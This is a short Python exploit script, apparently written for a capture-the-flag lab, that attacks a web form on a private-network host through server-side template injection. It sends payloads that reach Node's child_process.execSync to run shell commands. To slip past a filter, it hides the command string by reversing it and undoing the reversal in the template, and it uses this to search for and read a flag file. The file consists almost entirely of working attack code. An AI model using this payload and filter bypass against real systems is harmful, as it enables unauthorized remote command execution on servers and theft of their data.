import requests

URL = "http://192.168.227.179:5000"



#Demonstrate our payload works
def sstiDemo():
    payload = {"name": "dang", "king": "{{ 4+4 }}", "gift": "foo\nbar"}
    r = requests.post(URL, data=payload)
    print(r.text)

#Check payload
def checkPayload():
    payload = {"name": "dang", "king": "{{ range.constructor(\"return global.process.mainModule\")() }}", "gift": "foo\nbar"}
    r = requests.post(URL, data=payload)
    print(r.text)

def failedPayload():
    """ Gets Filtered"""

    payload = {"name": "dang", "king": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('ls -l')\")()}}", "gift": "foo\nbar"}

    r = requests.post(URL, data=payload)
    print(r.text)

def runCommand(theCommand="id"):
    """Run a command
    """

    kingString = "return global.process.mainModule.require('child_process').execSync('{0}')".format(theCommand)
    print ("Payload String")
    print(kingString)

    #Reverse the Thing
    revString = kingString[::-1]
    print(revString)
    
    payloadString = '{{{{range.constructor("{0}\" | reverse )()}}}}'.format(revString)
    print(payloadString)
    payload = {"name": "dang", "king": payloadString , "gift": "foo\nbar"}
    r = requests.post(URL, data=payload)
    print(r.text)

    
if __name__ == "__main__":
    #sstiDemo()
    #checkPayload()
    #failedPayload()
    runCommand()

    runCommand("find / -name flag.txt")
    #runCommand("cat /flag.txt")
